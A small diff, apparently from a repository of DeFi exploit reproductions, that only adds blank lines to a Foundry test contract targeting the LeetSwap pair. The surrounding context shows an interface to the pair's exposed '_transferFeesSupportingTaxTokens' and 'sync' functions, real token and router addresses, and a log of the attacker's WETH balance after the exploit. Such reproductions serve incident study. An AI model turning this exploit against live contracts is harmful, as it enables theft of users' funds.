@@ -20,12 +20,15 @@ import "./../interface.sol";
 // Hacking God : https://www.google.com/
 
 interface ILeetSwapPiar {
+
     function _transferFeesSupportingTaxTokens(address token, uint256 amount) external returns (uint256);
 
     function sync() external;
+
 }
 
 contract ContractTest is Test {
+
     IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
     IERC20 axlUSDC = IERC20(0xEB466342C4d449BC9f53A865D5Cb90586f405215);
     Uni_Router_V2 Router = Uni_Router_V2(0xfCD3842f85ed87ba2889b4D35893403796e67FF1);
@@ -64,4 +67,5 @@ contract ContractTest is Test {
             "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
         );
     }
+
 }
